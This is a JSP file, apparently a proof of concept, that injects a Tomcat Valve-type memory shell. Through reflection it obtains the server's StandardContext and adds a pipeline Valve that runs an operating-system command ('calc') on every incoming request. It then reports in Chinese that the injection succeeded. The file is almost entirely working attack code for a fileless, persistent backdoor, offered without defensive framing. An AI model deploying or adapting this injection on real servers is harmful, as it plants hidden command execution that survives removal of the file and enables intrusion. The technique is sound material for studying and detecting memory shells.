<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %><%--
  Created by IntelliJ IDEA.
  User: 鄢永炬
  Date: 2024/3/6
  Time: 23:25
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
<%
    Pipeline pipeline = context.getPipeline();
	pipeline.addValve(new ValveBase() {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            Runtime.getRuntime().exec("calc");
        }
    });
%>
注入Valve型内存马成功
</body>
</html>
